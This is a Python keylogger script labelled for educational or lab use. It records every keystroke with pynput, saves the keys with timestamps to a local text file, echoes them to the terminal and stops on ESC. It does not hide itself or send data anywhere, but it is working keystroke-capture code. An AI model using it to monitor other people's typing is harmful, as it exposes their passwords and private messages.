"""
=============================================================
  SIMPLE KEYLOGGER - For Educational / Lab Use Only
  File: keylogger.py
  How to run: python keylogger.py
=============================================================
"""

from pynput import keyboard
import datetime
import os
import time
import threading

# ──────────────────────────────────────────────
# CONFIGURATION - Edit these if you want
# ──────────────────────────────────────────────
LOG_FILE      = "keylog.txt"        # Where logs are saved
SAVE_INTERVAL = 5                   # Auto-save every N seconds
MAX_BUFFER    = 100                 # Save after 100 keystrokes

# ──────────────────────────────────────────────
# GLOBAL STATE
# ──────────────────────────────────────────────
key_buffer    = []       # Temporary buffer before writing to file
key_count     = 0        # Total keys pressed
start_time    = None
running       = True


def get_timestamp():
    """Returns a nicely formatted timestamp string."""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def write_header():
    """Writes a session header into the log file."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write("\n")
        f.write("=" * 60 + "\n")
        f.write(f"  SESSION STARTED: {get_timestamp()}\n")
        f.write("=" * 60 + "\n")
    print(f"[+] Keylogger started. Logging to: {os.path.abspath(LOG_FILE)}")
    print(f"[+] Press CTRL+C in this terminal to stop.\n")


def flush_buffer():
    """Writes the key buffer to the log file and clears it."""
    global key_buffer
    if key_buffer:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write("".join(key_buffer))
        key_buffer = []


def auto_save_loop():
    """Background thread: saves buffer every SAVE_INTERVAL seconds."""
    while running:
        time.sleep(SAVE_INTERVAL)
        flush_buffer()


def format_key(key):
    """
    Converts a raw pynput key into a readable string.
    
    Normal keys like 'a', 'b' become just the character.
    Special keys like ENTER, SPACE, BACKSPACE get labels like [ENTER].
    """
    try:
        # Regular character keys (a-z, 0-9, symbols)
        k = key.char
        if k is None:
            return "[?]"
        return k

    except AttributeError:
        # Special keys
        special = {
            keyboard.Key.space:     " ",
            keyboard.Key.enter:     "\n[ENTER]\n",
            keyboard.Key.backspace: "[BACK]",
            keyboard.Key.tab:       "[TAB]",
            keyboard.Key.shift:     "[SHIFT]",
            keyboard.Key.shift_r:   "[SHIFT]",
            keyboard.Key.ctrl_l:    "[CTRL]",
            keyboard.Key.ctrl_r:    "[CTRL]",
            keyboard.Key.alt_l:     "[ALT]",
            keyboard.Key.alt_r:     "[ALT]",
            keyboard.Key.caps_lock: "[CAPS]",
            keyboard.Key.esc:       "[ESC]",
            keyboard.Key.delete:    "[DEL]",
            keyboard.Key.up:        "[↑]",
            keyboard.Key.down:      "[↓]",
            keyboard.Key.left:      "[←]",
            keyboard.Key.right:     "[→]",
            keyboard.Key.f1:        "[F1]",
            keyboard.Key.f2:        "[F2]",
            keyboard.Key.f3:        "[F3]",
            keyboard.Key.f4:        "[F4]",
            keyboard.Key.f5:        "[F5]",
            keyboard.Key.f6:        "[F6]",
            keyboard.Key.f7:        "[F7]",
            keyboard.Key.f8:        "[F8]",
            keyboard.Key.f9:        "[F9]",
            keyboard.Key.f10:       "[F10]",
            keyboard.Key.f11:       "[F11]",
            keyboard.Key.f12:       "[F12]",
            keyboard.Key.end:       "[END]",
            keyboard.Key.home:      "[HOME]",
            keyboard.Key.page_up:   "[PgUp]",
            keyboard.Key.page_down: "[PgDn]",
        }
        return special.get(key, f"[{str(key).replace('Key.', '')}]")


def on_press(key):
    """
    Called automatically every time a key is pressed.
    This is the CORE of the keylogger.
    """
    global key_buffer, key_count, running

    # Stop condition: press ESC to quit
    if key == keyboard.Key.esc:
        print("\n[!] ESC pressed — stopping keylogger...")
        flush_buffer()
        write_footer()
        running = False
        return False   # returning False stops the listener

    formatted = format_key(key)
    key_buffer.append(formatted)
    key_count += 1

    # Print to terminal so you can watch live
    print(formatted, end="", flush=True)

    # Flush buffer if it gets large
    if len(key_buffer) >= MAX_BUFFER:
        flush_buffer()


def on_release(key):
    """Called when a key is released. We just pass here."""
    pass


def write_footer():
    """Writes a session summary at the end of the log file."""
    duration = round(time.time() - start_time, 1)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write("\n")
        f.write("-" * 60 + "\n")
        f.write(f"  SESSION ENDED:   {get_timestamp()}\n")
        f.write(f"  Total keys:      {key_count}\n")
        f.write(f"  Duration:        {duration} seconds\n")
        f.write("-" * 60 + "\n")
    print(f"\n\n[+] Done! Total keys logged: {key_count}")
    print(f"[+] Log saved to: {os.path.abspath(LOG_FILE)}")


def main():
    global start_time

    start_time = time.time()
    write_header()

    # Start the auto-save background thread
    saver = threading.Thread(target=auto_save_loop, daemon=True)
    saver.start()

    # Start listening to keyboard
    # suppress=False means your typing still works normally
    with keyboard.Listener(on_press=on_press, on_release=on_release, suppress=False) as listener:
        listener.join()


if __name__ == "__main__":
    main()
